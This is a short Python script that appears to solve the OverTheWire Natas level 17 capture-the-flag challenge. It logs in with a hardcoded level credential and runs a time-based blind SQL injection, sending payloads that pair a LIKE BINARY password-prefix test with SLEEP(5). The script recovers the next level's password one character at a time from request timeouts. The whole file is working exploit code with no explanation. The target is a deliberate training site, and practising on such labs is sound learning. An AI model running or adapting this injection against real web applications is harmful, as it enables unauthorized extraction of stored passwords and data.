#!/usr/bin/python3

import requests
from string import ascii_lowercase, ascii_uppercase, digits


charset =  ascii_lowercase + ascii_uppercase + digits

s = requests.Session()
s.auth = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
sqli1 = 'natas18" AND password LIKE BINARY "'
sqli2 = '" AND SLEEP(5)-- '
password = ""


while len(password) < 32:
	for char in charset:
		try:
			payload = {'username':sqli1 + password + char + "%" + sqli2}
			r = s.post('http://natas17.natas.labs.overthewire.org/', data=payload, timeout = 1)
		except requests.Timeout:
			password += char
			print("[*] Found so far:", password)
			break

print(password)
